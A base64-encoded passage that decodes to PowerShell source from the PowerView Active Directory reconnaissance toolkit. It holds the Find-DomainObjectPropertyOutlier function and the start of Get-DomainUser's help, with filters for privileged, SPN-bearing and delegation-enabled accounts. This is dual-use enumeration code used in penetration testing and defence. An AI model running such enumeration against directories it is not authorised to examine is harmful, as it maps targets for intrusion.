dHkgbmFtZXMgYXJlIHN1YnN0cmFjdGVkCmZyb20gdGhlIG1hc3RlciBzY2hlbWEgcHJvcGVydHl1IG5hbWUgbGlzdCB0byByZXRyaWV2ZSBhIHNldCBvZiAnbm9uLXN0YW5kYXJkJyBwcm9wZXJ0aWVzLgpFdmVyeSB1c2VyL2dyb3VwL2NvbXB1dGVyIG9iamVjdCAoZGVwZW5kaW5nIG9uIGRldGVybWluZWQgY2xhc3MpIGFyZSBlbnVtZXJhdGVkLCBhbmQgZm9yIGVhY2gKb2JqZWN0LCBpZiB0aGUgb2JqZWN0IGhhcyBhICdub24tc3RhbmRhcmQnIHByb3BlcnR5IHNldCwgdGhlIG9iamVjdCBzYW1BY2NvdW50TmFtZSwgcHJvcGVydHkKbmFtZSwgYW5kIHByb3BlcnR5IHZhbHVlIGFyZSBvdXRwdXQgdG8gdGhlIHBpcGVsaW5lLgoKLlBBUkFNRVRFUiBDbGFzc05hbWUKClNwZWNpZmllcyB0aGUgQUQgb2JqZWN0IGNsYXNzIHRvIGZpbmQgcHJvcGVydHkgb3V0bGllcnMgZm9yLCAndXNlcicsICdncm91cCcsIG9yICdjb21wdXRlcicuCklmIC1SZWZlcmVuY2VPYmplY3QgaXMgc3BlY2lmaWVkLCB0aGlzIHdpbGwgYmUgYXV0b21hdGljYWxseSBleHRyYWN0ZWQsIGlmIHBvc3NpYmxlLgoKLlBBUkFNRVRFUiBSZWZlcmVuY2VQcm9wZXJ0eVNldAoKU3BlY2lmaWVzIGFuIGFycmF5IG9mIHByb3BlcnR5IG5hbWVzIHRvIGRpZmYgYWdhaW5zdCB0aGUgY2xhc3Mgc2NoZW1hLgoKLlBBUkFNRVRFUiBSZWZlcmVuY2VPYmplY3QKClNwZWNpY2lmZXMgdGhlIFBvd2VyVmlldyB1c2VyL2dyb3VwL2NvbXB1dGVyIG9iamVjdCB0byBleHRyYWN0IHByb3BlcnR5IG5hbWVzCmZyb20gdG8gdXNlIGFzIHRoZSByZWZlcmVuY2Ugc2V0LgoKLlBBUkFNRVRFUiBEb21haW4KClNwZWNpZmllcyB0aGUgZG9tYWluIHRvIHVzZSBmb3IgdGhlIHF1ZXJ5LCBkZWZhdWx0cyB0byB0aGUgY3VycmVudCBkb21haW4uCgouUEFSQU1FVEVSIExEQVBGaWx0ZXIKClNwZWNpZmllcyBhbiBMREFQIHF1ZXJ5IHN0cmluZyB0aGF0IGlzIHVzZWQgdG8gZmlsdGVyIEFjdGl2ZSBEaXJlY3Rvcnkgb2JqZWN0cy4KCi5QQVJBTUVURVIgU2VhcmNoQmFzZQoKVGhlIExEQVAgc291cmNlIHRvIHNlYXJjaCB0aHJvdWdoLCBlLmcuICJMREFQOi8vT1U9c2VjcmV0LERDPXRlc3RsYWIsREM9bG9jYWwiClVzZWZ1bCBmb3IgT1UgcXVlcmllcy4KCi5QQVJBTUVURVIgU2VydmVyCgpTcGVjaWZpZXMgYW4gQWN0aXZlIERpcmVjdG9yeSBzZXJ2ZXIgKGRvbWFpbiBjb250cm9sbGVyKSB0byBiaW5kIHRvLgoKLlBBUkFNRVRFUiBTZWFyY2hTY29wZQoKU3BlY2lmaWVzIHRoZSBzY29wZSB0byBzZWFyY2ggdW5kZXIsIEJhc2UvT25lTGV2ZWwvU3VidHJlZSAoZGVmYXVsdCBvZiBTdWJ0cmVlKS4KCi5QQVJBTUVURVIgUmVzdWx0UGFnZVNpemUKClNwZWNpZmllcyB0aGUgUGFnZVNpemUgdG8gc2V0IGZvciB0aGUgTERBUCBzZWFyY2hlciBvYmplY3QuCgouUEFSQU1FVEVSIFNlcnZlclRpbWVMaW1pdAoKU3BlY2lmaWVzIHRoZSBtYXhpbXVtIGFtb3VudCBvZiB0aW1lIHRoZSBzZXJ2ZXIgc3BlbmRzIHNlYXJjaGluZy4gRGVmYXVsdCBvZiAxMjAgc2Vjb25kcy4KCi5QQVJBTUVURVIgVG9tYnN0b25lCgpTd2l0Y2guIFNwZWNpZmllcyB0aGF0IHRoZSBzZWFyY2hlciBzaG91bGQgYWxzbyByZXR1cm4gZGVsZXRlZC90b21ic3RvbmVkIG9iamVjdHMuCgouUEFSQU1FVEVSIENyZWRlbnRpYWwKCkEgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdIG9iamVjdCBvZiBhbHRlcm5hdGUgY3JlZGVudGlhbHMKZm9yIGNvbm5lY3Rpb24gdG8gdGhlIHRhcmdldCBkb21haW4uCgouRVhBTVBMRQoKRmluZC1Eb21haW5PYmplY3RQcm9wZXJ0eU91dGxpZXIgLVVzZXIKCkVudW1lcmF0ZXMgdXNlcnMgaW4gdGhlIGN1cnJlbnQgZG9tYWluIHdpdGggJ291dGxpZXInIHByb3BlcnRpZXMgZmlsbGVkIGluLgoKLkVYQU1QTEUKCkZpbmQtRG9tYWluT2JqZWN0UHJvcGVydHlPdXRsaWVyIC1Hcm91cCAtRG9tYWluIGV4dGVybmFsLmxvY2FsCgpFbnVtZXJhdGVzIGdyb3VwcyBpbiB0aGUgZXh0ZXJuYWwubG9jYWwgZm9yZXN0L2RvbWFpbiB3aXRoICdvdXRsaWVyJyBwcm9wZXJ0aWVzIGZpbGxlZCBpbi4KCi5FWEFNUExFCgpHZXQtRG9tYWluQ29tcHV0ZXIgLUZpbmRPbmUgfCBGaW5kLURvbWFpbk9iamVjdFByb3BlcnR5T3V0bGllcgoKRW51bWVyYXRlcyBjb21wdXRlcnMgaW4gdGhlIGN1cnJlbnQgZG9tYWluIHdpdGggJ291dGxpZXInIHByb3BlcnRpZXMgZmlsbGVkIGluLgoKLk9VVFBVVFMKClBvd2VyVmlldy5Qcm9wZXJ0eU91dGxpZXIKCkN1c3RvbSBQU09iamVjdCB3aXRoIHRyYW5zbGF0ZWQgb2JqZWN0IHByb3BlcnR5IG91dGxpZXJzLgojPgoKICAgIFtEaWFnbm9zdGljcy5Db2RlQW5hbHlzaXMuU3VwcHJlc3NNZXNzYWdlQXR0cmlidXRlKCdQU1Nob3VsZFByb2Nlc3MnLCAnJyldCiAgICBbT3V0cHV0VHlwZSgnUG93ZXJWaWV3LlByb3BlcnR5T3V0bGllcicpXQogICAgW0NtZGxldEJpbmRpbmcoRGVmYXVsdFBhcmFtZXRlclNldE5hbWUgPSAnQ2xhc3NOYW1lJyldCiAgICBQYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgTWFuZGF0b3J5ID0gJFRydWUsIFBhcmFtZXRlclNldE5hbWUgPSAnQ2xhc3NOYW1lJyldCiAgICAgICAgW0FsaWFzKCdDbGFzcycpXQogICAgICAgIFtWYWxpZGF0ZVNldCgnVXNlcicsICdHcm91cCcsICdDb21wdXRlcicpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJENsYXNzTmFtZSwKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nW11dCiAgICAgICAgJFJlZmVyZW5jZVByb3BlcnR5U2V0LAoKICAgICAgICBbUGFyYW1ldGVyKFZhbHVlRnJvbVBpcGVsaW5lID0gJFRydWUsIE1hbmRhdG9yeSA9ICRUcnVlLCBQYXJhbWV0ZXJTZXROYW1lID0gJ1JlZmVyZW5jZU9iamVjdCcpXQogICAgICAgIFtQU0N1c3RvbU9iamVjdF0KICAgICAgICAkUmVmZXJlbmNlT2JqZWN0LAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJERvbWFpbiwKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ0ZpbHRlcicpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJExEQVBGaWx0ZXIsCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdBRFNQYXRoJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VhcmNoQmFzZSwKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ0RvbWFpbkNvbnRyb2xsZXInKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZXJ2ZXIsCgogICAgICAgIFtWYWxpZGF0ZVNldCgnQmFzZScsICdPbmVMZXZlbCcsICdTdWJ0cmVlJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VhcmNoU2NvcGUgPSAnU3VidHJlZScsCgogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsIDEwMDAwKV0KICAgICAgICBbSW50XQogICAgICAgICRSZXN1bHRQYWdlU2l6ZSA9IDIwMCwKCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwgMTAwMDApXQogICAgICAgIFtJbnRdCiAgICAgICAgJFNlcnZlclRpbWVMaW1pdCwKCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkVG9tYnN0b25lLAoKICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0KICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLkNyZWRlbnRpYWxBdHRyaWJ1dGUoKV0KICAgICAgICAkQ3JlZGVudGlhbCA9IFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXTo6RW1wdHkKICAgICkKCiAgICBCRUdJTiB7CiAgICAgICAgJFVzZXJSZWZlcmVuY2VQcm9wZXJ0eVNldCA9IEAoJ2FkbWluY291bnQnLCdhY2NvdW50ZXhwaXJlcycsJ2JhZHBhc3N3b3JkdGltZScsJ2JhZHB3ZGNvdW50JywnY24nLCdjb2RlcGFnZScsJ2NvdW50cnljb2RlJywnZGVzY3JpcHRpb24nLCAnZGlzcGxheW5hbWUnLCdkaXN0aW5ndWlzaGVkbmFtZScsJ2RzY29yZXByb3BhZ2F0aW9uZGF0YScsJ2dpdmVubmFtZScsJ2luc3RhbmNldHlwZScsJ2lzY3JpdGljYWxzeXN0ZW1vYmplY3QnLCdsYXN0bG9nb2ZmJywnbGFzdGxvZ29uJywnbGFzdGxvZ29udGltZXN0YW1wJywnbG9ja291dHRpbWUnLCdsb2dvbmNvdW50JywnbWVtYmVyb2YnLCdtc2RzLXN1cHBvcnRlZGVuY3J5cHRpb250eXBlcycsJ25hbWUnLCdvYmplY3RjYXRlZ29yeScsJ29iamVjdGNsYXNzJywnb2JqZWN0Z3VpZCcsJ29iamVjdHNpZCcsJ3ByaW1hcnlncm91cGlkJywncHdkbGFzdHNldCcsJ3NhbWFjY291bnRuYW1lJywnc2FtYWNjb3VudHR5cGUnLCdzbicsJ3VzZXJhY2NvdW50Y29udHJvbCcsJ3VzZXJwcmluY2lwYWxuYW1lJywndXNuY2hhbmdlZCcsJ3VzbmNyZWF0ZWQnLCd3aGVuY2hhbmdlZCcsJ3doZW5jcmVhdGVkJykKCiAgICAgICAgJEdyb3VwUmVmZXJlbmNlUHJvcGVydHlTZXQgPSBAKCdhZG1pbmNvdW50JywnY24nLCdkZXNjcmlwdGlvbicsJ2Rpc3Rpbmd1aXNoZWRuYW1lJywnZHNjb3JlcHJvcGFnYXRpb25kYXRhJywnZ3JvdXB0eXBlJywnaW5zdGFuY2V0eXBlJywnaXNjcml0aWNhbHN5c3RlbW9iamVjdCcsJ21lbWJlcicsJ21lbWJlcm9mJywnbmFtZScsJ29iamVjdGNhdGVnb3J5Jywnb2JqZWN0Y2xhc3MnLCdvYmplY3RndWlkJywnb2JqZWN0c2lkJywnc2FtYWNjb3VudG5hbWUnLCdzYW1hY2NvdW50dHlwZScsJ3N5c3RlbWZsYWdzJywndXNuY2hhbmdlZCcsJ3VzbmNyZWF0ZWQnLCd3aGVuY2hhbmdlZCcsJ3doZW5jcmVhdGVkJykKCiAgICAgICAgJENvbXB1dGVyUmVmZXJlbmNlUHJvcGVydHlTZXQgPSBAKCdhY2NvdW50ZXhwaXJlcycsJ2JhZHBhc3N3b3JkdGltZScsJ2JhZHB3ZGNvdW50JywnY24nLCdjb2RlcGFnZScsJ2NvdW50cnljb2RlJywnZGlzdGluZ3Vpc2hlZG5hbWUnLCdkbnNob3N0bmFtZScsJ2RzY29yZXByb3BhZ2F0aW9uZGF0YScsJ2luc3RhbmNldHlwZScsJ2lzY3JpdGljYWxzeXN0ZW1vYmplY3QnLCdsYXN0bG9nb2ZmJywnbGFzdGxvZ29uJywnbGFzdGxvZ29udGltZXN0YW1wJywnbG9jYWxwb2xpY3lmbGFncycsJ2xvZ29uY291bnQnLCdtc2RzLXN1cHBvcnRlZGVuY3J5cHRpb250eXBlcycsJ25hbWUnLCdvYmplY3RjYXRlZ29yeScsJ29iamVjdGNsYXNzJywnb2JqZWN0Z3VpZCcsJ29iamVjdHNpZCcsJ29wZXJhdGluZ3N5c3RlbScsJ29wZXJhdGluZ3N5c3RlbXNlcnZpY2VwYWNrJywnb3BlcmF0aW5nc3lzdGVtdmVyc2lvbicsJ3ByaW1hcnlncm91cGlkJywncHdkbGFzdHNldCcsJ3NhbWFjY291bnRuYW1lJywnc2FtYWNjb3VudHR5cGUnLCdzZXJ2aWNlcHJpbmNpcGFsbmFtZScsJ3VzZXJhY2NvdW50Y29udHJvbCcsJ3VzbmNoYW5nZWQnLCd1c25jcmVhdGVkJywnd2hlbmNoYW5nZWQnLCd3aGVuY3JlYXRlZCcpCgogICAgICAgICRTZWFyY2hlckFyZ3VtZW50cyA9IEB7fQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0RvbWFpbiddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snRG9tYWluJ10gPSAkRG9tYWluIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydMREFQRmlsdGVyJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydMREFQRmlsdGVyJ10gPSAkTERBUEZpbHRlciB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VhcmNoQmFzZSddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snU2VhcmNoQmFzZSddID0gJFNlYXJjaEJhc2UgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlcnZlciddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snU2VydmVyJ10gPSAkU2VydmVyIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZWFyY2hTY29wZSddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snU2VhcmNoU2NvcGUnXSA9ICRTZWFyY2hTY29wZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snUmVzdWx0UGFnZVNpemUnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1Jlc3VsdFBhZ2VTaXplJ10gPSAkUmVzdWx0UGFnZVNpemUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlcnZlclRpbWVMaW1pdCddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snU2VydmVyVGltZUxpbWl0J10gPSAkU2VydmVyVGltZUxpbWl0IH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydUb21ic3RvbmUnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1RvbWJzdG9uZSddID0gJFRvbWJzdG9uZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snQ3JlZGVudGlhbCddID0gJENyZWRlbnRpYWwgfQoKICAgICAgICAjIERvbWFpbiAvIENyZWRlbnRpYWwKICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydEb21haW4nXSkgewogICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsKICAgICAgICAgICAgICAgICRUYXJnZXRGb3Jlc3QgPSBHZXQtRG9tYWluIC1Eb21haW4gJERvbWFpbiB8IFNlbGVjdC1PYmplY3QgLUV4cGFuZFByb3BlcnR5IEZvcmVzdCB8IFNlbGVjdC1PYmplY3QgLUV4cGFuZFByb3BlcnR5IE5hbWUKICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICRUYXJnZXRGb3Jlc3QgPSBHZXQtRG9tYWluIC1Eb21haW4gJERvbWFpbiAtQ3JlZGVudGlhbCAkQ3JlZGVudGlhbCB8IFNlbGVjdC1PYmplY3QgLUV4cGFuZFByb3BlcnR5IEZvcmVzdCB8IFNlbGVjdC1PYmplY3QgLUV4cGFuZFByb3BlcnR5IE5hbWUKICAgICAgICAgICAgfQogICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbRmluZC1Eb21haW5PYmplY3RQcm9wZXJ0eU91dGxpZXJdIEVudW1lcmF0ZWQgZm9yZXN0ICckVGFyZ2V0Rm9yZXN0JyBmb3IgdGFyZ2V0IGRvbWFpbiAnJERvbWFpbiciCiAgICAgICAgfQoKICAgICAgICAkU2NoZW1hQXJndW1lbnRzID0gQHt9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7ICRTY2hlbWFBcmd1bWVudHNbJ0NyZWRlbnRpYWwnXSA9ICRDcmVkZW50aWFsIH0KICAgICAgICBpZiAoJFRhcmdldEZvcmVzdCkgewogICAgICAgICAgICAkU2NoZW1hQXJndW1lbnRzWydGb3Jlc3QnXSA9ICRUYXJnZXRGb3Jlc3QKICAgICAgICB9CiAgICB9CgogICAgUFJPQ0VTUyB7CgogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1JlZmVyZW5jZVByb3BlcnR5U2V0J10pIHsKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0ZpbmQtRG9tYWluT2JqZWN0UHJvcGVydHlPdXRsaWVyXSBVc2luZyBzcGVjaWZpZWQgLVJlZmVyZW5jZVByb3BlcnR5U2V0IgogICAgICAgICAgICAkUmVmZXJlbmNlT2JqZWN0UHJvcGVydGllcyA9ICRSZWZlcmVuY2VQcm9wZXJ0eVNldAogICAgICAgIH0KICAgICAgICBlbHNlaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snUmVmZXJlbmNlT2JqZWN0J10pIHsKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0ZpbmQtRG9tYWluT2JqZWN0UHJvcGVydHlPdXRsaWVyXSBFeHRyYWN0aW5nIHByb3BlcnR5IG5hbWVzIGZyb20gLVJlZmVyZW5jZU9iamVjdCB0byB1c2UgYXMgdGhlIHJlZmVyZW5jZSBwcm9wZXJ0eSBzZXQiCiAgICAgICAgICAgICRSZWZlcmVuY2VPYmplY3RQcm9wZXJ0aWVzID0gR2V0LU1lbWJlciAtSW5wdXRPYmplY3QgJFJlZmVyZW5jZU9iamVjdCAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgfCBTZWxlY3QtT2JqZWN0IC1FeHBhbmQgTmFtZQogICAgICAgICAgICAkUmVmZXJlbmNlT2JqZWN0Q2xhc3MgPSAkUmVmZXJlbmNlT2JqZWN0Lm9iamVjdGNsYXNzIHwgU2VsZWN0LU9iamVjdCAtTGFzdCAxCiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltGaW5kLURvbWFpbk9iamVjdFByb3BlcnR5T3V0bGllcl0gQ2FsZHVsYXRlZCBSZWZlcmVuY2VPYmplY3RDbGFzcyA6ICRSZWZlcmVuY2VPYmplY3RDbGFzcyIKICAgICAgICB9CiAgICAgICAgZWxzZSB7CiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltGaW5kLURvbWFpbk9iamVjdFByb3BlcnR5T3V0bGllcl0gVXNpbmcgdGhlIGRlZmF1bHQgcmVmZXJlbmNlIHByb3BlcnR5IHNldCBmb3IgdGhlIG9iamVjdCBjbGFzcyAnJENsYXNzTmFtZSciCiAgICAgICAgfQoKICAgICAgICBpZiAoKCRDbGFzc05hbWUgLWVxICdVc2VyJykgLW9yICgkUmVmZXJlbmNlT2JqZWN0Q2xhc3MgLWVxICdVc2VyJykpIHsKICAgICAgICAgICAgJE9iamVjdHMgPSBHZXQtRG9tYWluVXNlciBAU2VhcmNoZXJBcmd1bWVudHMKICAgICAgICAgICAgJFNjaGVtYUNsYXNzID0gR2V0LUZvcmVzdFNjaGVtYUNsYXNzIEBTY2hlbWFBcmd1bWVudHMgLUNsYXNzTmFtZSAnVXNlcicKICAgICAgICAgICAgJFJlZmVyZW5jZU9iamVjdFByb3BlcnRpZXMgPSAkVXNlclJlZmVyZW5jZVByb3BlcnR5U2V0CiAgICAgICAgfQogICAgICAgIGVsc2VpZiAoKCRDbGFzc05hbWUgLWVxICdHcm91cCcpIC1vciAoJFJlZmVyZW5jZU9iamVjdENsYXNzIC1lcSAnR3JvdXAnKSkgewogICAgICAgICAgICAkT2JqZWN0cyA9IEdldC1Eb21haW5Hcm91cCBAU2VhcmNoZXJBcmd1bWVudHMKICAgICAgICAgICAgJFNjaGVtYUNsYXNzID0gR2V0LUZvcmVzdFNjaGVtYUNsYXNzIEBTY2hlbWFBcmd1bWVudHMgLUNsYXNzTmFtZSAnR3JvdXAnCiAgICAgICAgICAgICRSZWZlcmVuY2VPYmplY3RQcm9wZXJ0aWVzID0gJEdyb3VwUmVmZXJlbmNlUHJvcGVydHlTZXQKICAgICAgICB9CiAgICAgICAgZWxzZWlmICgoJENsYXNzTmFtZSAtZXEgJ0NvbXB1dGVyJykgLW9yICgkUmVmZXJlbmNlT2JqZWN0Q2xhc3MgLWVxICdDb21wdXRlcicpKSB7CiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIkNPTVBVVEVSISIKICAgICAgICAgICAgJE9iamVjdHMgPSBHZXQtRG9tYWluQ29tcHV0ZXIgQFNlYXJjaGVyQXJndW1lbnRzCiAgICAgICAgICAgICRTY2hlbWFDbGFzcyA9IEdldC1Gb3Jlc3RTY2hlbWFDbGFzcyBAU2NoZW1hQXJndW1lbnRzIC1DbGFzc05hbWUgJ0NvbXB1dGVyJwogICAgICAgICAgICAkUmVmZXJlbmNlT2JqZWN0UHJvcGVydGllcyA9ICRDb21wdXRlclJlZmVyZW5jZVByb3BlcnR5U2V0CiAgICAgICAgfQogICAgICAgIGVsc2UgewogICAgICAgICAgICB0aHJvdyAiW0ZpbmQtRG9tYWluT2JqZWN0UHJvcGVydHlPdXRsaWVyXSBJbnZhbGlkIGNsYXNzOiAkQ2xhc3NOYW1lIgogICAgICAgIH0KCiAgICAgICAgJFNjaGVtYVByb3BlcnRpZXMgPSAkU2NoZW1hQ2xhc3MgfCBTZWxlY3QtT2JqZWN0IC1FeHBhbmRQcm9wZXJ0eSBPcHRpb25hbFByb3BlcnRpZXMgfCBTZWxlY3QtT2JqZWN0IC1FeHBhbmRQcm9wZXJ0eSBuYW1lCiAgICAgICAgJFNjaGVtYVByb3BlcnRpZXMgKz0gJFNjaGVtYUNsYXNzIHwgU2VsZWN0LU9iamVjdCAtRXhwYW5kUHJvcGVydHkgTWFuZGF0b3J5UHJvcGVydGllcyB8IFNlbGVjdC1PYmplY3QgLUV4cGFuZFByb3BlcnR5IG5hbWUKCiAgICAgICAgIyBmaW5kIHRoZSBzY2hlbWEgcHJvcGVydGllcyB0aGF0IGFyZSBOT1QgaW4gdGhlIGZpcnN0IHJldHVybmVkIHJlZmVyZW5jZSBwcm9wZXJ0eSBzZXQKICAgICAgICAkTm9uc3RhbmRhcmRQcm9wZXJ0aWVzID0gQ29tcGFyZS1PYmplY3QgLVJlZmVyZW5jZU9iamVjdCAkUmVmZXJlbmNlT2JqZWN0UHJvcGVydGllcyAtRGlmZmVyZW5jZU9iamVjdCAkU2NoZW1hUHJvcGVydGllcyAtUGFzc1RocnUKCiAgICAgICAgRm9yRWFjaCAoJE9iamVjdCBpbiAkT2JqZWN0cykgewogICAgICAgICAgICAkT2JqZWN0UHJvcGVydGllcyA9IEdldC1NZW1iZXIgLUlucHV0T2JqZWN0ICRPYmplY3QgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IHwgU2VsZWN0LU9iamVjdCAtRXhwYW5kIE5hbWUKICAgICAgICAgICAgRm9yRWFjaCgkT2JqZWN0UHJvcGVydHkgaW4gJE9iamVjdFByb3BlcnRpZXMpIHsKICAgICAgICAgICAgICAgIGlmICgkTm9uc3RhbmRhcmRQcm9wZXJ0aWVzIC1Db250YWlucyAkT2JqZWN0UHJvcGVydHkpIHsKICAgICAgICAgICAgICAgICAgICAkT3V0ID0gTmV3LU9iamVjdCBQU09iamVjdAogICAgICAgICAgICAgICAgICAgICRPdXQgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnU2FtQWNjb3VudE5hbWUnICRPYmplY3QuU2FtQWNjb3VudE5hbWUKICAgICAgICAgICAgICAgICAgICAkT3V0IHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ1Byb3BlcnR5JyAkT2JqZWN0UHJvcGVydHkKICAgICAgICAgICAgICAgICAgICAkT3V0IHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ1ZhbHVlJyAkT2JqZWN0LiRPYmplY3RQcm9wZXJ0eQogICAgICAgICAgICAgICAgICAgICRPdXQuUFNPYmplY3QuVHlwZU5hbWVzLkluc2VydCgwLCAnUG93ZXJWaWV3LlByb3BlcnR5T3V0bGllcicpCiAgICAgICAgICAgICAgICAgICAgJE91dAogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQp9CgoKIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKIwojICJuZXQgKiIgcmVwbGFjZW1lbnRzIGFuZCBvdGhlciBmdW4gc3RhcnQgYmVsb3cKIwojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwoKZnVuY3Rpb24gR2V0LURvbWFpblVzZXIgewo8IwouU1lOT1BTSVMKClJldHVybiBhbGwgdXNlcnMgb3Igc3BlY2lmaWMgdXNlciBvYmplY3RzIGluIEFELgoKQXV0aG9yOiBXaWxsIFNjaHJvZWRlciAoQGhhcm1qMHkpICAKTGljZW5zZTogQlNEIDMtQ2xhdXNlICAKUmVxdWlyZWQgRGVwZW5kZW5jaWVzOiBHZXQtRG9tYWluU2VhcmNoZXIsIENvbnZlcnQtQUROYW1lLCBDb252ZXJ0LUxEQVBQcm9wZXJ0eSAgCgouREVTQ1JJUFRJT04KCkJ1aWxkcyBhIGRpcmVjdG9yeSBzZWFyY2hlciBvYmplY3QgdXNpbmcgR2V0LURvbWFpblNlYXJjaGVyLCBidWlsZHMgYSBjdXN0b20KTERBUCBmaWx0ZXIgYmFzZWQgb24gdGFyZ2V0aW5nL2ZpbHRlciBwYXJhbWV0ZXJzLCBhbmQgc2VhcmNoZXMgZm9yIGFsbCBvYmplY3RzCm1hdGNoaW5nIHRoZSBjcml0ZXJpYS4gVG8gb25seSByZXR1cm4gc3BlY2lmaWMgcHJvcGVydGllcywgdXNlCiItUHJvcGVydGllcyBzYW1hY2NvdW50bmFtZSx1c25jaGFuZ2VkLC4uLiIuIEJ5IGRlZmF1bHQsIGFsbCB1c2VyIG9iamVjdHMgZm9yCnRoZSBjdXJyZW50IGRvbWFpbiBhcmUgcmV0dXJuZWQuCgouUEFSQU1FVEVSIElkZW50aXR5CgpBIFNhbUFjY291bnROYW1lIChlLmcuIGhhcm1qMHkpLCBEaXN0aW5ndWlzaGVkTmFtZSAoZS5nLiBDTj1oYXJtajB5LENOPVVzZXJzLERDPXRlc3RsYWIsREM9bG9jYWwpLApTSUQgKGUuZy4gUy0xLTUtMjEtODkwMTcxODU5LTM0MzM4MDkyNzktMzM2NjE5Njc1My0xMTA4KSwgb3IgR1VJRCAoZS5nLiA0YzQzNWRkNy1kYzU4LTRiMTQtOWE1ZS0xZmRiMGU4MGQyMDEpLgpXaWxkY2FyZHMgYWNjZXB0ZWQuIEFsc28gYWNjZXB0cyBET01BSU5cdXNlciBmb3JtYXQuCgouUEFSQU1FVEVSIFNQTgoKU3dpdGNoLiBPbmx5IHJldHVybiB1c2VyIG9iamVjdHMgd2l0aCBub24tbnVsbCBzZXJ2aWNlIHByaW5jaXBhbCBuYW1lcy4KCi5QQVJBTUVURVIgQWRtaW5Db3VudAoKU3dpdGNoLiBSZXR1cm4gdXNlcnMgd2l0aCAnKGFkbWluQ291bnQ9MSknIChtZWFuaW5nIGFyZS93ZXJlIHByaXZpbGVnZWQpLgoKLlBBUkFNRVRFUiBBbGxvd0RlbGVnYXRpb24KClN3aXRjaC4gUmV0dXJuIHVzZXIgYWNjb3VudHMgdGhhdCBhcmUgbm90IG1hcmtlZCBhcyAnc2Vuc2l0aXZlIGFuZCBub3QgYWxsb3dlZCBmb3IgZGVsZWdhdGlvbicKCi5QQVJBTUVURVIgRGlzYWxsb3dEZWxlZ2F0aW9uCgpTd2l0Y2guIFJldHVybiB1c2VyIGFjY291bnRzIHRoYXQgYXJlIG1hcmtlZCBhcyAnc2Vuc2l0aXZlIGFuZCBub3QgYWxsb3dlZCBmb3IgZGVsZWdhdGlvbicKCi5QQVJBTUVURVIgVHJ1c3RlZFRvQXV0aAoKU3dpdGNoLiBSZXR1cm4gY29tcHV0ZXIgb2JqZWN0cyB0aGF0IGFyZSB0cnVzdGVkIHRvIGF1dGhlbnRpY2F0ZSBmb3I